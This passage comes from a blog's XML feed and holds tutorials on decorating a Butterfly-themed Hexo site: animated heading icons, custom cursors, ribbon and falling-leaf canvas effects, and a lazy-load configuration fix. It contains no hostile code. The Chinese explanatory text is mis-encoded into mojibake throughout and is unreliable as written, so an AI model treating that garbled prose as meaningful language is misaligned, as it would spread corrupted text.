href="https://augu1sto.gitee.io/ee36c104ddd2/">Hexoç¾åŒ–|ç«™å® ï¼Ÿçœ‹æ¿å¨˜ï¼Ÿlive2dé…ç½®ï¼ˆé™„é­”æ”¹æ’ä»¶å’Œæ–°æ¨¡å‹ï¼‰</a></p><p><a href="https://zhuanlan.zhihu.com/p/58325389">Hexoåšå®¢NexTä¸»é¢˜ç¾åŒ–ä¹‹æ–°å¢çœ‹æ¿å¨˜(èƒ½è¯´è¯ã€èƒ½æ¢è£…)</a></p><h1 id="å°æ ‡é¢˜æ·»åŠ æ—‹è½¬å°é£è½¦"><a href="#å°æ ‡é¢˜æ·»åŠ æ—‹è½¬å°é£è½¦" class="headerlink" title="å°æ ‡é¢˜æ·»åŠ æ—‹è½¬å°é£è½¦"></a>å°æ ‡é¢˜æ·»åŠ æ—‹è½¬å°é£è½¦</h1><p>1ã€æ‰“å¼€ _config.butterfly.yml<br>æ‰¾åˆ° Beautifyï¼Œå°† <a href="https://so.csdn.net/so/search?q=enable&spm=1001.2101.3001.7020">enable</a> è®¾ç½®ä¸º trueï¼Œtitle-prefix-icon è®¾ç½®ä¸º â€˜\f863â€™</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># Beautify (ç¾åŒ–é é¢é¡¯ç¤º)</span><br><span class="line">beautify:</span><br><span class="line">    enable: <span class="literal">true</span></span><br><span class="line">    field: post # site/post</span><br><span class="line">    title-prefix-icon: <span class="string">&#x27;\f863&#x27;</span> # <span class="string">&#x27;\f0c1&#x27;</span></span><br><span class="line">    title-prefix-icon-color: <span class="string">&quot;#F47466&quot;</span></span><br></pre></td></tr></table></figure><p>2ã€åœ¨ä¸»é¢˜<a href="https://so.csdn.net/so/search?q=%E6%96%87%E4%BB%B6%E5%A4%B9&spm=1001.2101.3001.7020">æ–‡ä»¶å¤¹</a> source&#x2F;css&#x2F; ä¸­åˆ›å»ºä¸€ä¸ª icon.cssï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* æ–‡ç« é¡µH1-H6å›¾æ ‡æ ·å¼æ•ˆæœ */</span></span><br><span class="line"><span class="comment">/* æ§åˆ¶é£è½¦è½¬åŠ¨é€Ÿåº¦ 4sé‚£é‡Œå¯ä»¥è‡ªå·±è°ƒèŠ‚å¿«æ…¢ */</span></span><br><span class="line">h1::before,</span><br><span class="line">h2::before,</span><br><span class="line">h3::before,</span><br><span class="line">h4::before,</span><br><span class="line">h5::before,</span><br><span class="line">h6::before &#123;</span><br><span class="line">  -webkit-animation: ccc 4s linear infinite;</span><br><span class="line">  animation: ccc 4s linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* æ§åˆ¶é£è½¦è½¬åŠ¨æ–¹å‘ -1turn ä¸ºé€†æ—¶é’ˆè½¬åŠ¨ï¼Œ1turn ä¸ºé¡ºæ—¶é’ˆè½¬åŠ¨ï¼Œç›¸åŒæ•°å­—éƒ¨åˆ†è®°å¾—ç»Ÿä¸€ä¿®æ”¹ */</span></span><br><span class="line">@-webkit-keyframes ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@keyframes</span> ccc &#123;</span><br><span class="line">  <span class="number">0</span>% &#123;</span><br><span class="line">    -webkit-transform: rotate(0deg);</span><br><span class="line">    transform: rotate(0deg);</span><br><span class="line">  &#125;</span><br><span class="line">  to &#123;</span><br><span class="line">    -webkit-transform: rotate(-1turn);</span><br><span class="line">    transform: rotate(-1turn);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* è®¾ç½®é£è½¦é¢œè‰² */</span></span><br><span class="line">#content-inner.layout h1::before &#123;</span><br><span class="line">  color: #ef50a8;</span><br><span class="line">  margin-left: -<span class="number">1.</span>55rem;</span><br><span class="line">  font-size: <span class="number">1.</span>3rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>23rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h2::before &#123;</span><br><span class="line">  color: #fb7061;</span><br><span class="line">  margin-left: -<span class="number">1.</span>35rem;</span><br><span class="line">  font-size: <span class="number">1.</span>1rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>12rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h3::before &#123;</span><br><span class="line">  color: #ffbf00;</span><br><span class="line">  margin-left: -<span class="number">1.</span>22rem;</span><br><span class="line">  font-size: <span class="number">0.</span>95rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h4::before &#123;</span><br><span class="line">  color: #a9e000;</span><br><span class="line">  margin-left: -<span class="number">1.</span>05rem;</span><br><span class="line">  font-size: <span class="number">0.</span>8rem;</span><br><span class="line">  margin-top: -<span class="number">0.</span>09rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h5::before &#123;</span><br><span class="line">  color: #57c850;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>7rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h6::before &#123;</span><br><span class="line">  color: #5ec1e0;</span><br><span class="line">  margin-left: -<span class="number">0.</span>9rem;</span><br><span class="line">  font-size: <span class="number">0.</span>66rem;</span><br><span class="line">  margin-top: 0rem;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* sè®¾ç½®é£è½¦hoveråŠ¨æ•ˆ 6sé‚£é‡Œå¯ä»¥è‡ªå·±è°ƒèŠ‚å¿«æ…¢*/</span></span><br><span class="line">#content-inner.layout h1:hover,</span><br><span class="line">#content-inner.layout h2:hover,</span><br><span class="line">#content-inner.layout h3:hover,</span><br><span class="line">#content-inner.layout h4:hover,</span><br><span class="line">#content-inner.layout h5:hover,</span><br><span class="line">#content-inner.layout h6:hover &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">&#125;</span><br><span class="line">#content-inner.layout h1:hover::before,</span><br><span class="line">#content-inner.layout h2:hover::before,</span><br><span class="line">#content-inner.layout h3:hover::before,</span><br><span class="line">#content-inner.layout h4:hover::before,</span><br><span class="line">#content-inner.layout h5:hover::before,</span><br><span class="line">#content-inner.layout h6:hover::before &#123;</span><br><span class="line">  color: <span class="keyword">var</span>(--theme-color);</span><br><span class="line">  -webkit-animation: ccc 6s linear infinite;</span><br><span class="line">  animation: ccc 6s linear infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ã€å¹¶åœ¨ _config.butterfly.yml ä¸­æ‰¾åˆ° <a href="https://so.csdn.net/so/search?q=inject&spm=1001.2101.3001.7020">inject</a>ï¼Œåœ¨ head ä¸‹æ·»åŠ </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">- &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/icon.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå±•ç¤ºæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111534447.png" alt="img"> </p><h1 id="è‡ªå®šä¹‰é¼ æ ‡æŒ‡é’ˆæ ·å¼"><a href="#è‡ªå®šä¹‰é¼ æ ‡æŒ‡é’ˆæ ·å¼" class="headerlink" title="è‡ªå®šä¹‰é¼ æ ‡æŒ‡é’ˆæ ·å¼"></a><strong>è‡ªå®šä¹‰é¼ æ ‡æŒ‡é’ˆæ ·å¼</strong></h1><p>1ã€é€‰å®šå¥½çœ‹çš„é¼ æ ‡æ ·å¼ï¼Œè¿™å—ä¸ºäº†ç®€ç­”ï¼Œé€‰æ‹©ä¸¤ç§é¼ æ ‡æ ·å¼ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535448.png" alt="img"> </p><p>ä¸‹è½½åœ°å€ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/TRHX/CDN-for-itrhx.com@1.0/images/mouse.cur</span></span><br><span class="line">https:<span class="comment">//cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/img/pointer.cur</span></span><br></pre></td></tr></table></figure><p>2ã€åœ¨ &#x2F;themes&#x2F;butterfly&#x2F;source&#x2F;cssè·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ªmouse.cssæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">  cursor:url(/img/pointer/mouse.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br><span class="line">a,</span><br><span class="line">img &#123;</span><br><span class="line">  cursor:url(/img/pointer/pointer.cur),</span><br><span class="line">        <span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3ã€æ‰“å¼€ç«™ç‚¹ä¸»é¢˜é…ç½®æ–‡ä»¶_config.butterfly.ymlï¼Œæ‰¾åˆ°injectï¼Œåœ¨headå¤„ç›´æ¥å¼•å…¥è¯¥æ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">  - &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/css/mouse.css&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535495.png" alt="img"> </p><h1 id="æ·»åŠ èƒŒæ™¯åŠ¨æ€å½©å¸¦æ•ˆæœ"><a href="#æ·»åŠ èƒŒæ™¯åŠ¨æ€å½©å¸¦æ•ˆæœ" class="headerlink" title="æ·»åŠ èƒŒæ™¯åŠ¨æ€å½©å¸¦æ•ˆæœ"></a>æ·»åŠ èƒŒæ™¯åŠ¨æ€å½©å¸¦æ•ˆæœ</h1><p>butterflyæä¾›ä¸‰ç§æ•ˆæœï¼šé™æ­¢å½©å¸¦ã€åŠ¨æ€å½©å¸¦ã€canvas_nest</p><p>æˆ‘é€‰çš„æ˜¯åŠ¨æ€å½©æ¡ï¼Œä¿®æ”¹ä¸»é¢˜é…ç½®æ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">canvas_fluttering_ribbon: # åŠ¨æ€å½©å¸¦</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  mobile: <span class="literal">false</span> # <span class="literal">false</span> æ‰‹æœºç«¯ä¸æ˜¾ç¤º <span class="literal">true</span> æ‰‹æœºç«¯æ˜¾ç¤º</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111535952.png" alt="img"> </p><h1 id="æ·»åŠ æ«å¶é£˜è½æ•ˆæœ"><a href="#æ·»åŠ æ«å¶é£˜è½æ•ˆæœ" class="headerlink" title="æ·»åŠ æ«å¶é£˜è½æ•ˆæœ"></a>æ·»åŠ æ«å¶é£˜è½æ•ˆæœ</h1><p>æ­¥éª¤å’Œå‰é¢çš„åŸºæœ¬ç±»ä¼¼ï¼Œéƒ½æ˜¯æœ¬åœ°å¼•å…¥JSæ–‡ä»¶ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­ç›´æ¥è°ƒç”¨å³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stop, staticx;</span><br><span class="line"><span class="type">var</span> <span class="variable">img</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">img.src = <span class="string">&quot;https://img.cdn.nesxc.com/2022/02/202202251325420webp&quot;</span>;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">Sakura</span><span class="params">(x, y, s, r, fn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = x;</span><br><span class="line">    <span class="built_in">this</span>.y = y;</span><br><span class="line">    <span class="built_in">this</span>.s = s;</span><br><span class="line">    <span class="built_in">this</span>.r = r;</span><br><span class="line">    <span class="built_in">this</span>.fn = fn</span><br><span class="line">&#125;</span><br><span class="line">Sakura.prototype.draw = function(cxt) &#123;</span><br><span class="line">    cxt.save();</span><br><span class="line">    <span class="type">var</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="number">20</span> * <span class="built_in">this</span>.s / <span class="number">2</span>;</span><br><span class="line">    cxt.translate(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    cxt.rotate(<span class="built_in">this</span>.r);</span><br><span class="line">    cxt.drawImage(img, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span> * <span class="built_in">this</span>.s, <span class="number">20</span> * <span class="built_in">this</span>.s);</span><br><span class="line">    cxt.restore()</span><br><span class="line">&#125;;</span><br><span class="line">Sakura.prototype.update = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = <span class="built_in">this</span>.fn.x(<span class="built_in">this</span>.x, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.y = <span class="built_in">this</span>.fn.y(<span class="built_in">this</span>.y, <span class="built_in">this</span>.y);</span><br><span class="line">    <span class="built_in">this</span>.r = <span class="built_in">this</span>.fn.r(<span class="built_in">this</span>.r);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.x &gt; window.innerWidth || <span class="built_in">this</span>.x &lt; <span class="number">0</span> || <span class="built_in">this</span>.y &gt; window.innerHeight || <span class="built_in">this</span>.y &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Math.random() &gt; <span class="number">0.4</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.y = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.x = window.innerWidth;</span><br><span class="line">            <span class="built_in">this</span>.y = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.s = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.r = getRandom(<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList = function() &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = []</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.push = function(sakura) &#123;</span><br><span class="line">    <span class="built_in">this</span>.list.push(sakura)</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.update = function() &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].update()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.draw = function(cxt) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, len = <span class="built_in">this</span>.list.length; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>.list[i].draw(cxt)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.get = function(i) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list[i]</span><br><span class="line">&#125;;</span><br><span class="line">SakuraList.prototype.size = function() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list.length</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">getRandom</span><span class="params">(option)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> ret, random;</span><br><span class="line">    <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;x&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerWidth;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;y&quot;</span>:</span><br><span class="line">            ret = Math.random() * window.innerHeight;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;s&quot;</span>:</span><br><span class="line">            ret = Math.random();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;r&quot;</span>:</span><br><span class="line">            ret = Math.random() * <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnx&quot;</span>:</span><br><span class="line">            random = -<span class="number">0.5</span> + Math.random() * <span class="number">1</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> x + <span class="number">0.5</span> * random - <span class="number">1.7</span></span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fny&quot;</span>:</span><br><span class="line">            random = <span class="number">1.5</span> + Math.random() * <span class="number">0.7</span>;</span><br><span class="line">            ret = function(x, y) &#123;</span><br><span class="line">                <span class="keyword">return</span> y + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;fnr&quot;</span>:</span><br><span class="line">            random = Math.random() * <span class="number">0.03</span>;</span><br><span class="line">            ret = function(r) &#123;</span><br><span class="line">                <span class="keyword">return</span> r + random</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">startSakura</span><span class="params">()</span> &#123;</span><br><span class="line">    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || window.oRequestAnimationFrame;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvas</span> <span class="operator">=</span> document.createElement(<span class="string">&quot;canvas&quot;</span>),</span><br><span class="line">        cxt;</span><br><span class="line">    staticx = <span class="literal">true</span>;</span><br><span class="line">    canvas.height = window.innerHeight;</span><br><span class="line">    canvas.width = window.innerWidth;</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;style&quot;</span>, <span class="string">&quot;position: fixed;left: 0;top: 0;pointer-events: none;&quot;</span>);</span><br><span class="line">    canvas.setAttribute(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">    document.getElementsByTagName(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].appendChild(canvas);</span><br><span class="line">    cxt = canvas.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line">    <span class="type">var</span> <span class="variable">sakuraList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SakuraList</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> sakura, randomX, randomY, randomS, randomR, randomFnx, randomFny;</span><br><span class="line">        randomX = getRandom(<span class="string">&quot;x&quot;</span>);</span><br><span class="line">        randomY = getRandom(<span class="string">&quot;y&quot;</span>);</span><br><span class="line">        randomR = getRandom(<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        randomS = getRandom(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">        randomFnx = getRandom(<span class="string">&quot;fnx&quot;</span>);</span><br><span class="line">        randomFny = getRandom(<span class="string">&quot;fny&quot;</span>);</span><br><span class="line">        randomFnR = getRandom(<span class="string">&quot;fnr&quot;</span>);</span><br><span class="line">        sakura = <span class="keyword">new</span> <span class="title class_">Sakura</span>(randomX, randomY, randomS, randomR, &#123;</span><br><span class="line">            x: randomFnx,</span><br><span class="line">            y: randomFny,</span><br><span class="line">            r: randomFnR</span><br><span class="line">        &#125;);</span><br><span class="line">        sakura.draw(cxt);</span><br><span class="line">        sakuraList.push(sakura)</span><br><span class="line">    &#125;</span><br><span class="line">    stop = requestAnimationFrame(function() &#123;</span><br><span class="line">        cxt.clearRect(<span class="number">0</span>, <span class="number">0</span>, canvas.width, canvas.height);</span><br><span class="line">        sakuraList.update();</span><br><span class="line">        sakuraList.draw(cxt);</span><br><span class="line">        stop = requestAnimationFrame(arguments.callee)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">window.onresize = function() &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">canvasSnow</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_snow&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line">img.onload = function() &#123;</span><br><span class="line">    startSakura()</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function <span class="title function_">stopp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (staticx) &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">child</span> <span class="operator">=</span> document.getElementById(<span class="string">&quot;canvas_sakura&quot;</span>);</span><br><span class="line">        child.parentNode.removeChild(child);</span><br><span class="line">        window.cancelAnimationFrame(stop);</span><br><span class="line">        staticx = <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startSakura()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨é…ç½®æ–‡ä»¶ä¸­å¼•å…¥ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head</span><br><span class="line">  bottom:</span><br><span class="line">    - &lt;script src=<span class="string">&quot;/js/leaves.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> ä¸»é¢˜ç¾åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³hexoå¼€å¯æ‡’åŠ è½½åå›¾ç‰‡æ— æ³•ç«‹å³æ˜¾ç¤ºçš„é—®é¢˜</title>
      <link href="/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2024/04/11/%E8%A7%A3%E5%86%B3hexo%E5%BC%80%E5%90%AF%E6%87%92%E5%8A%A0%E8%BD%BD%E5%90%8E%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E7%AB%8B%E5%8D%B3%E6%98%BE%E7%A4%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="æœ¬æ–‡ç›®çš„"><a href="#æœ¬æ–‡ç›®çš„" class="headerlink" title="æœ¬æ–‡ç›®çš„"></a>æœ¬æ–‡ç›®çš„</h1><p>ä¸»è¦ä»‹ç»hexo-lazyload-imageï¼ˆå›¾ç‰‡æ‡’åŠ è½½ï¼‰æ’ä»¶å¼•å‘çš„bugä»¥åŠç›¸å…³API</p><h1 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h1><p>ç½‘ç«™å¼€å¯å›¾ç‰‡æ‡’åŠ è½½åï¼Œé¦–æ¬¡åŠ è½½é¡µé¢å›¾ç‰‡ä¸æ˜¾ç¤ºï¼Œä½†æ˜¯åˆ·æ–°ä¸€æ¬¡åä¼šæ˜¾ç¤ºã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202404/202404111526969.png" alt="img"> </p><h1 id="å®šä½åŸå› "><a href="#å®šä½åŸå› " class="headerlink" title="å®šä½åŸå› "></a>å®šä½åŸå› </h1><p>ä¸ºäº†æå‡ç½‘é¡µçš„æµè§ˆä½“éªŒï¼Œå¼€å¯äº†pjaxä¼˜åŒ–ï¼Œå…¶åŸç†åœ¨äºpjaxå°è£…äº†ajaxå®ç°å±€éƒ¨åˆ·æ–°ï¼Œå°†ç½‘ç«™å˜æˆäº†å•é¡µé¢åº”ç”¨ã€‚</p><p>æ‡’åŠ è½½æ’ä»¶å¦‚æœé…ç½®ä¸å½“ï¼Œå°†ä¸pjaxæ’ä»¶å‘ç”Ÿå†²çªï¼Œå¯¼è‡´ä»¥ä¸Šbugã€‚</p><h1 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h1><p>æ‰¾åˆ°hexoé¡¹ç›®çš„æ ¹ç›®å½•ä¸‹çš„ç«™ç‚¹é…ç½®æ–‡ä»¶_config.ymlï¼Œå…·ä½“è·¯å¾„ï¼šblog&#x2F;_config.ymlï¼Œå…¶ä¸­blogæ˜¯ä½ çš„é¡¹ç›®æ–‡ä»¶å¤¹ã€‚</p><p>æ‰¾åˆ°lazyloadé…ç½®ï¼Œæ·»ä¸ŠisSPA: trueå­—æ®µå³å¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">true</span> # optional</span><br></pre></td></tr></table></figure><h1 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h1><p>æ¥ä»”ç»†çœ‹ä¸€ä¸‹hexo-lazyload-image æ’ä»¶çš„APIï¼Œå®ƒå…±æœ‰5ä¸ªé…ç½®é¡¹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  onlypost: <span class="literal">false</span> # optional</span><br><span class="line">  loadingImg: # optional eg ./images/loading.gif</span><br><span class="line">  isSPA: <span class="literal">false</span> # optional</span><br><span class="line">  preloadRatio: <span class="number">3</span> # optional, <span class="keyword">default</span> is <span class="number">1</span></span><br></pre></td></tr></table></figure><p><strong>onlypost</strong></p><ul><li>trueï¼šåªæœ‰è·¯ç”±é¡µé¢æˆ–è€…æ–‡ç« çš„å›¾ç‰‡æ‰ä¼šè¢«æ‡’åŠ è½½ã€‚</li><li>falseï¼šé™¤äº†ç«™ç‚¹èƒŒæ™¯å›¾ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰ï¼Œæ•´ä¸ªç«™ç‚¹çš„å›¾ç‰‡å‡ä¼šè¢«æ‡’åŠ è½½ã€‚</li></ul><p><strong>loadingImg</strong>ï¼šæŒ‡å®šçš„è¯ï¼ŒåŠ è½½è‡ªå®šä¹‰è·¯å¾„çš„å›¾ç‰‡ç”¨ä½œæ–‡ç« å›¾ç‰‡åŠ è½½æ—¶æ˜¾ç¤ºï¼Œä¸æŒ‡å®šçš„è¯æ˜¾ç¤ºé»˜è®¤å›¾ç‰‡ã€‚</p><p><strong>isSPA</strong></p><ul><li>trueï¼šé’ˆå¯¹å•é¡µé¢åº”ç”¨ï¼Œå½“æ»šåŠ¨æ¡æ»šåŠ¨åˆ°å›¾ç‰‡ä½ç½®æ—¶å°±ä¼šå‘åç«¯è¯·æ±‚å›¾ç‰‡</li><li>falseï¼šåˆ·æ–°æ‰èƒ½è¯·æ±‚å›¾ç‰‡</li></ul><p><strong>preloadRatio</strong>ï¼šåœ¨å¤šå°‘å€çš„å¯è§åŒºåŸŸæ—¶è§¦å‘å›¾ç‰‡è¯·æ±‚ï¼Œé»˜è®¤ä¸º1ï¼Œå³å½“å‰å±å¹•çš„åŒºåŸŸã€‚</p>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ­å»º </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‡’åŠ è½½ </tag>
            
            <tag> åšå®¢ä¼˜åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoç¦ç”¨è°ƒè¯•æ¨¡å¼</title>
      <link href="/2024/04/09/Hexo%E7%A6%81%E7%94%A8%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F/"/>
